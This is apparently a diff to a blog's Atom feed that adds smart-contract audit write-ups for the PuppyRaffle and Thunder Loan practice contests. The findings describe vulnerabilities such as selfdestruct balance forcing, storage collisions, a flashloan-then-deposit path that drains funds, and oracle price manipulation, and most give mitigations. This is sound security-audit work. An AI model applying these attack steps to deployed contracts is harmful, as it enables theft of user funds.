+&lt;&#x2F;span&gt;&lt;span&gt;-       }
+&lt;&#x2F;span&gt;&lt;span&gt;-   }
+&lt;&#x2F;span&gt;&lt;span&gt;emit RaffleEnter(newPlayers);
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;.
+&lt;&#x2F;span&gt;&lt;span&gt;function selectWinner() external {
+&lt;&#x2F;span&gt;&lt;span&gt;+   raffleId = raffleId + 1;
+&lt;&#x2F;span&gt;&lt;span&gt;require(block.timestamp &amp;gt;= raffleStartTime + raffleDuration, &amp;quot;PuppyRaffle: Raffle not over&amp;quot;);
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;m-2-having-a-strict-balance-check-in-raffle-selectwinner-will-allow-attacker-to-send-extra-eth-to-contract-using-self-destruct-which-make-to-halt-the-withdraw-the-money&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#m-2-having-a-strict-balance-check-in-raffle-selectwinner-will-allow-attacker-to-send-extra-eth-to-contract-using-self-destruct-which-make-to-halt-the-withdraw-the-money&quot; aria-label=&quot;Anchor link for: m-2-having-a-strict-balance-check-in-raffle-selectwinner-will-allow-attacker-to-send-extra-eth-to-contract-using-self-destruct-which-make-to-halt-the-withdraw-the-money&quot;&gt;[M-2] Having a strict balance check in &lt;code&gt;Raffle:selectWinner&lt;&#x2F;code&gt; will allow attacker to send extra eth to contract using self-destruct which make to halt the withdraw the money&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+In &lt;code&gt;Raffle:selectWinner&lt;&#x2F;code&gt; we do have a condition to check whether the contract is having the exact balance that we received as a &lt;strong&gt;Fee&lt;&#x2F;strong&gt;. Point to remember is there is always a way to send eth to any contract other than the functionalities the contract provided so having this strict condition is not considering other ways to send eth which eventually breaks this condition and revert which makes no one to withdraw the money.
+&lt;strong&gt;Recommendation:&lt;&#x2F;strong&gt;
+Use &lt;code&gt;address(this).balance &amp;gt;= uint256(totalFees)&lt;&#x2F;code&gt; instead of &lt;code&gt;address(this).balance == uint256(totalFees)&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h1 id=&quot;low&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#low&quot; aria-label=&quot;Anchor link for: low&quot;&gt;Low&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;l-1-using-dynamic-types-with-abi-encodepacked-and-giving-this-value-to-generate-hash-using-keccak256-in-raffle-selectwinner-will-lead-to-collisions&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#l-1-using-dynamic-types-with-abi-encodepacked-and-giving-this-value-to-generate-hash-using-keccak256-in-raffle-selectwinner-will-lead-to-collisions&quot; aria-label=&quot;Anchor link for: l-1-using-dynamic-types-with-abi-encodepacked-and-giving-this-value-to-generate-hash-using-keccak256-in-raffle-selectwinner-will-lead-to-collisions&quot;&gt;[L-1] Using dynamic types with &lt;code&gt;abi.encodePacked()&lt;&#x2F;code&gt; and giving this value to generate hash using &lt;code&gt;keccak256()&lt;&#x2F;code&gt; in &lt;code&gt;Raffle::selectWinner&lt;&#x2F;code&gt; will lead to collisions.&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+Inside the &lt;code&gt;Raffle::selectWinner&lt;&#x2F;code&gt; function we have been generating a hash using the &lt;code&gt;keccak256()&lt;&#x2F;code&gt; function and the input that we are giving to this function is from &lt;code&gt;abi.encodePacked()&lt;&#x2F;code&gt; which eventually leads to have collisions on the generated hashes.
+&lt;strong&gt;Instances:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;Found in src&#x2F;PuppyRaffle.sol: 128&lt;&#x2F;li&gt;
+&lt;li&gt;Found in src&#x2F;PuppyRaffle.sol: 139&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;h2 id=&quot;l-2-referring-to-players-length-in-raffle-selectwinner-will-lead-to-wrong-calculation&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#l-2-referring-to-players-length-in-raffle-selectwinner-will-lead-to-wrong-calculation&quot; aria-label=&quot;Anchor link for: l-2-referring-to-players-length-in-raffle-selectwinner-will-lead-to-wrong-calculation&quot;&gt;[L-2] Referring to &lt;code&gt;players.length&lt;&#x2F;code&gt; in &lt;code&gt;Raffle:selectWinner&lt;&#x2F;code&gt; will lead to wrong calculation&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+In &lt;code&gt;Raffle:selectWinner&lt;&#x2F;code&gt; we were calculating the total fee by multiplying &lt;code&gt;player.length&lt;&#x2F;code&gt; with &lt;code&gt;entranceFee&lt;&#x2F;code&gt;. Here we are not considering the people who left the raffle in between by using the &lt;code&gt;refund&lt;&#x2F;code&gt; functionality. We are not removing those from the list but making their index as empty which won&#x27;t affect the length of the list.
+Ex. 100 people joined the raffle and 10 people left from it so currently we have only &lt;code&gt;90 * entranceFee&lt;&#x2F;code&gt; but in our code we are considering the amount as &lt;code&gt;100 * entraceFee&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;l-3-exit-functionality-will-make-the-raffle-to-select-the-winner-even-we-have-less-than-4-people-in-the-game&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#l-3-exit-functionality-will-make-the-raffle-to-select-the-winner-even-we-have-less-than-4-people-in-the-game&quot; aria-label=&quot;Anchor link for: l-3-exit-functionality-will-make-the-raffle-to-select-the-winner-even-we-have-less-than-4-people-in-the-game&quot;&gt;[L-3] Exit functionality will make the raffle to select the winner even we have less than 4 people in the game.&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+In &lt;code&gt;Raffle:selectWinner&lt;&#x2F;code&gt; we have a condition to select the winner only after we have 4 people on the Game along with other conditions. Unfortunately we are not considering the &lt;strong&gt;exit&lt;&#x2F;strong&gt; functionality which provides a way for people to exit from the Game by using the &lt;code&gt;Raffle:refund&lt;&#x2F;code&gt; functionality. It breaks the business rules.&lt;&#x2F;p&gt;
+&lt;hr &#x2F;&gt;
+&lt;h1 id=&quot;gas&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#gas&quot; aria-label=&quot;Anchor link for: gas&quot;&gt;Gas&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;g-1-improper-mutability-for-variables-will-increase-gas-cost&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#g-1-improper-mutability-for-variables-will-increase-gas-cost&quot; aria-label=&quot;Anchor link for: g-1-improper-mutability-for-variables-will-increase-gas-cost&quot;&gt;[G-1] Improper mutability for variables will increase Gas cost&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Constant Instances:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;PuppyRaffle.commonImageUri (src&#x2F;PuppyRaffle.sol#38) should be constant
+&lt;&#x2F;span&gt;&lt;span&gt;PuppyRaffle.rareImageUri (src&#x2F;PuppyRaffle.sol#43) should be constant
+&lt;&#x2F;span&gt;&lt;span&gt;PuppyRaffle.legendaryImageUri (src&#x2F;PuppyRaffle.sol#48) should be constant
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Immutable Instances:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;PuppyRaffle.raffleDuration (src&#x2F;PuppyRaffle.sol#24) should be immutable
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>First Flight 3 : Thunder Loan</title>
+        <published>2023-10-25T00:00:00+00:00</published>
+        <updated>2023-10-25T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              Unknown
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://4l0n3r.github.io/writeups/first-flight-3-thunder-loan/"/>
+        <id>https://4l0n3r.github.io/writeups/first-flight-3-thunder-loan/</id>
+        
+        <content type="html" xml:base="https://4l0n3r.github.io/writeups/first-flight-3-thunder-loan/">&lt;h1 id=&quot;high&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#high&quot; aria-label=&quot;Anchor link for: high&quot;&gt;High&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;h-1-storage-collision-due-to-variable-order-mismatch&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#h-1-storage-collision-due-to-variable-order-mismatch&quot; aria-label=&quot;Anchor link for: h-1-storage-collision-due-to-variable-order-mismatch&quot;&gt;[H-1] Storage Collision Due to Variable Order Mismatch&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;
+In the &lt;code&gt;ThunderLoan.sol&lt;&#x2F;code&gt; contract, the storage variables are declared in the following order:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;uint256 private s_feePrecision;  
+&lt;&#x2F;span&gt;&lt;span&gt;uint256 private s_flashLoanFee; &#x2F;&#x2F; 0.3% ETH fee
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;However, in the upgraded &lt;code&gt;ThunderLoanUpgraded.sol&lt;&#x2F;code&gt; contract, the order is changed:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;uint256 private s_flashLoanFee; &#x2F;&#x2F; 0.3% ETH fee  
+&lt;&#x2F;span&gt;&lt;span&gt;uint256 public constant FEE_PRECISION = 1e18;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Since Solidity relies on the order of variable declaration to assign storage slots, changing the order during an upgrade causes the &lt;code&gt;s_flashLoanFee&lt;&#x2F;code&gt; to incorrectly take on the value of &lt;code&gt;s_feePrecision&lt;&#x2F;code&gt;. Additionally, the &lt;code&gt;s_currentlyFlashLoaning&lt;&#x2F;code&gt; mapping will point to an incorrect storage location, leading to undefined behavior.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;
+After upgrading:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Incorrect Fees:&lt;&#x2F;strong&gt; The &lt;code&gt;s_flashLoanFee&lt;&#x2F;code&gt; will be set to the previous &lt;code&gt;s_feePrecision&lt;&#x2F;code&gt; value, leading to users being charged incorrect flash loan fees.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Broken Mapping:&lt;&#x2F;strong&gt; The &lt;code&gt;s_currentlyFlashLoaning&lt;&#x2F;code&gt; mapping will be misaligned, potentially allowing users to bypass restrictions or causing faulty state tracking.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Proof of Code:&lt;&#x2F;strong&gt;
+The storage layout difference can be verified by running:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;forge&lt;&#x2F;span&gt;&lt;span&gt; inspect ThunderLoan storage  
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;forge&lt;&#x2F;span&gt;&lt;span&gt; inspect ThunderLoanUpgraded storage
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;h2 id=&quot;h-2-incorrect-updateexchangerate-call-in-deposit-function&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#h-2-incorrect-updateexchangerate-call-in-deposit-function&quot; aria-label=&quot;Anchor link for: h-2-incorrect-updateexchangerate-call-in-deposit-function&quot;&gt;[H-2] Incorrect &lt;code&gt;updateExchangeRate&lt;&#x2F;code&gt; Call in &lt;code&gt;deposit&lt;&#x2F;code&gt; Function&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;In the &lt;code&gt;deposit&lt;&#x2F;code&gt; function of the &lt;code&gt;ThunderLoan&lt;&#x2F;code&gt; contract, the &lt;code&gt;updateExchangeRate&lt;&#x2F;code&gt; function is unnecessarily called with &lt;code&gt;calculatedFee&lt;&#x2F;code&gt; immediately after minting.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
+&lt;&#x2F;span&gt;&lt;span&gt;    AssetToken assetToken = s_tokenToAssetToken[token];
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 exchangeRate = assetToken.getExchangeRate();
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) &#x2F; exchangeRate;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    emit Deposit(msg.sender, token, amount);
+&lt;&#x2F;span&gt;&lt;span&gt;    assetToken.mint(msg.sender, mintAmount);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    uint256 calculatedFee = getCalculatedFee(token, amount);
+&lt;&#x2F;span&gt;&lt;span&gt;    assetToken.updateExchangeRate(calculatedFee);
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;    token.safeTransferFrom(msg.sender, address(assetToken), amount);
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The call to &lt;code&gt;updateExchangeRate&lt;&#x2F;code&gt; happens &lt;strong&gt;before&lt;&#x2F;strong&gt; the transferred amount is reflected in the asset balance. This leads to incorrect updates of the exchange rate.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Incorrect Withdrawals:&lt;&#x2F;strong&gt; Users may be unable to withdraw correct amounts due to the miscalculated exchange rate.&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;strong&gt;Unfair Reward Distribution:&lt;&#x2F;strong&gt; The updated exchange rate can cause unfair distribution of rewards, as the value is changed without accounting for the actual token balance.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h2 id=&quot;h-3-flashloan-and-deposit-exploit-allows-fund-theft&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#h-3-flashloan-and-deposit-exploit-allows-fund-theft&quot; aria-label=&quot;Anchor link for: h-3-flashloan-and-deposit-exploit-allows-fund-theft&quot;&gt;[H-3] Flashloan and Deposit Exploit Allows Fund Theft&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+A critical vulnerability exists where users can exploit the system by calling &lt;code&gt;ThunderLoan::deposit&lt;&#x2F;code&gt; instead of &lt;code&gt;ThunderLoan::repay&lt;&#x2F;code&gt; after taking a flashloan. This allows malicious users to bypass proper repayment and drain all funds from the protocol.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Malicious actors can steal all available funds from the protocol by manipulating the flashloan and deposit mechanism.&lt;&#x2F;li&gt;
+&lt;li&gt;This could result in a complete loss of user deposits and system insolvency.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;&lt;strong&gt;Recommended Mitigation:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Enforce strict checks to ensure that any outstanding flashloan must be repaid using &lt;code&gt;ThunderLoan::repay&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;Implement tracking to verify that all flashloaned funds are returned before allowing new deposits.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;hr &#x2F;&gt;
+&lt;h1 id=&quot;medium&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#medium&quot; aria-label=&quot;Anchor link for: medium&quot;&gt;Medium&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;m-1-vulnerability-in-tswap-price-oracle-allows-price-manipulation-attacks&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#m-1-vulnerability-in-tswap-price-oracle-allows-price-manipulation-attacks&quot; aria-label=&quot;Anchor link for: m-1-vulnerability-in-tswap-price-oracle-allows-price-manipulation-attacks&quot;&gt;[M-1] Vulnerability in TSwap Price Oracle Allows Price Manipulation Attacks&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;p&gt;&lt;strong&gt;Description:&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+The ThunderLoan protocol relies on the TSwap AMM (Automated Market Maker) for price calculations. TSwap uses a constant product formula to determine token prices based on the pool&#x27;s reserves. This mechanism is vulnerable to manipulation by users who perform large token swaps within a single transaction, bypassing protocol fees.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Impact:&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;
+Malicious users can manipulate token prices during a flash loan, leading to inaccurate pricing. This results in reduced fees for liquidity providers and potential financial loss for the protocol.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Proof of Concept:&lt;&#x2F;strong&gt;
+Within a single transaction, a user can exploit the price calculation as follows:&lt;&#x2F;p&gt;
+&lt;ol&gt;
+&lt;li&gt;The user initiates a flash loan from ThunderLoan for 1000 tokenA, paying the standard fee (&lt;code&gt;fee1&lt;&#x2F;code&gt;).&lt;&#x2F;li&gt;
+&lt;li&gt;During the flash loan, the user sells 1000 tokenA, significantly reducing its price in the TSwap pool.&lt;&#x2F;li&gt;
+&lt;li&gt;Instead of repaying the flash loan immediately, the user takes a second flash loan for 1000 tokenA at a much lower price due to the manipulated price calculation:&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function getPriceInWeth(address token) public view returns (uint256) {
+&lt;&#x2F;span&gt;&lt;span&gt;    address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
+&lt;&#x2F;span&gt;&lt;span&gt;    return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
+&lt;&#x2F;span&gt;&lt;span&gt;}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;ol start=&quot;4&quot;&gt;
+&lt;li&gt;The user repays the first flash loan and subsequently repays the second one at a lower cost.&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+&lt;p&gt;A proof of concept exists in the audit-data folder, demonstrating this exploit.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;strong&gt;Recommended Mitigation:&lt;&#x2F;strong&gt;
+To prevent price manipulation, replace the TSwap-based price calculation with a more robust oracle system. Consider using Chainlink price feeds as the primary oracle, with a Uniswap TWAP (Time-Weighted Average Price) fallback mechanism for enhanced security and accuracy.&lt;&#x2F;p&gt;
+</content>
+        
+    </entry>
+</feed>
